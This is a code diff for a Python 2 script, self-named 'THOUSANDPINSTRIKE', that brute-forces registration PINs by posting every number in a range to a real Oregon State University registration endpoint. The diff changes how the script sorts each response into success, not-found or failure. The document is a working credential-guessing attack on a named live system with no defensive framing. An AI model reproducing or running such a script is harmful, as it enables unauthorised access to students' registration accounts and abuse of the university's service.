@@ -43,10 +43,13 @@ def attempt_pin(pin):
     res = req.post('https://adminfo.ucsadm.oregonstate.edu/prod/bwskfreg.P_CheckAltPin', {'pin': pin})
 
     print pin
-    if page_title(res) != 'Registration PIN Verification':
-        return True
-    elif not 'NOTFOUND' in res.content:
-        return False
+    pin_title = 'Registration PIN Verification'
+    if page_title(res) != pin_title:
+        return 'SUCCESS'
+    elif page_title(res) == pin_title and 'NOTFOUND' in res.content:
+        return 'NOTFOUND'
+    else:
+        return 'FAIL'
 
 
 def main(args):
@@ -59,14 +62,14 @@ def main(args):
         if not select_term():
             print "[ERR] Could not select term."
             return
-    print "INITIATE THOUSANDPINSTRIKE"
-    print "Starting: {0} End: {1}".format(args.start, args.end)
+    print "INITIATE THOUSANDPINSTRIKE %s-%s" % (args.start, args.end)
     for pin in range(args.start, args.end):
-        if attempt_pin(str(pin)):
+        status = attempt_pin(str(pin))
+        if status == 'SUCCESS':
             print "THOUSANDPINSTRIKE COMPLETE: " + pin
-            return
-        else:
+        elif status == 'FAIL':
             print "Pin attempt failed."
+            return
 
 
 if __name__ == '__main__':
